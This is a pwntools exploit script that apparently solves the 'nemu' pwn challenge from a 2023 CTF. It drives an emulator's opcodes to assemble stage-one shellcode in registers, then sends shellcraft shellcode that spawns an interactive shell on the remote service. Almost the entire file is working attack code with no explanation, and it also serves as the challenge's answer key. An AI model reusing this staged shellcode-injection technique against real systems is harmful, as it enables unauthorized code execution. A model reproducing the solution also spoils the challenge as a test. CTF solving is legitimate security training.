from pwn import *
import sys

elf = ELF("chall")

# io = process(elf.path)
io = remote('nemu.2023.ricercactf.com', 9002)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

def set_reg(r, val):
    io.sendlineafter(b'opcode: ', str(1).encode())
    io.sendlineafter(b'operand: ', b'#' + str(val).encode())
    if(r == b'r0'):
        return
    io.sendlineafter(b'opcode: ', str(2).encode())
    io.sendlineafter(b'operand: ', r)

def add_reg(r):
    io.sendlineafter(b'opcode: ', str(6).encode())
    io.sendlineafter(b'operand: ', r)

def dbl(r):
    io.sendlineafter(b'opcode: ', str(4).encode())
    io.sendlineafter(b'operand: ', r)
    
shellcode = asm(
    "xor rax, rax;\n"
    "xor rdi, rdi;\n"
    "mov rsi, rbx;\n"
    "mov edx, 0x200;\n"
    "syscall;\n"
    "jmp rdi;\n"
    "nop;\n"
    "nop"
)

print(f'shellcode: {shellcode}')

set_reg(b'r1', u32(shellcode[16:]))
for i in range(32):
    dbl(b'r1')

set_reg(b'r2', u32(shellcode[12:16]))
for i in range(32):
    dbl(b'r2')

set_reg(b'r3', u32(shellcode[8:12]))
for i in range(32):
    dbl(b'r3')

set_reg(b'r0', u32(shellcode[4:8]))
for i in range(32):
    dbl(b'r0')

set_reg(b'r0', u32(shellcode[:4]))

add_reg(b'r0')

io.sendline(asm(shellcraft.sh()))

io.interactive()